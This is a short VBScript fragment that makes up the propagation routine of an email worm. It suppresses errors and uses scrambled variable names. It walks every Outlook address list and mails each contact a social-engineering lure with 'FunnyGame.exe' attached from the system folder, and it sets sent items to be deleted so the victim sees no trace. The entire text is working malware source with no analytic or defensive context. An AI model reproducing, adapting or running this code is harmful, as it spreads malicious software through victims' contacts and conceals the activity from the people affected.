On Error Resume Next
Set terqne = CreateObject("Scripting.FileSystemObject")
Set qumhzh = CreateObject("WScript.Shell")
Set sys = terqne.GetSpecialFolder(1)
copyname = sys&"\FunnyGame.exe"
Set htgx = CreateObject("Outlook.Application")
Set ofcc = htgx.GetNameSpace("MAPI")
For each c In ofcc.AddressLists
If c.AddressEntries.Count <> 0 Then
For d = 1 To c.AddressEntries.Count
Set etldb = htgx.CreateItem(0)
etldb.To = c.AddressEntries(d).Address
etldb.Subject = "New game from the net for you " & c.AddressEntries(d).Name
etldb.Body = "Play at this funny game. It's very cool !"
etldb.Attachments.Add(copyname)
etldb.DeleteAfterSubmit = True
If etldb.To <> "" Then
etldb.Send
End If
Next
End If
Next
